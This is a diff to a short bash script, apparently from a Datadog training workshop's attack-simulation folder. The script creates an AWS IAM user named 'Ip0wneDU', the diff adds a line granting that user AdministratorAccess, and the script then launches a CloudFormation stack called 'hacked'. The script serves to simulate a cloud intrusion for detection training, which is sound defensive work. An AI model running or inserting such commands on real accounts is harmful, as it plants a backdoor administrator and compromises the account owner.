@@ -1,6 +1,7 @@
 #!/usr/bin/env bash
 
 aws iam create-user --user-name Ip0wneDU
+aws iam attach-user-policy --user-name Ip0wneDU --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
 aws cloudformation create-stack  --stack-name hacked --template-body file:///opt/datadog-training/learning-center-assets/workshops/securing-cloud-native-infrastructure/attack-simulation/launch.yaml --region us-east-2 --capabilities="CAPABILITY_NAMED_IAM"
 
     until [ "$status" = "CREATE_COMPLETE" ]; do
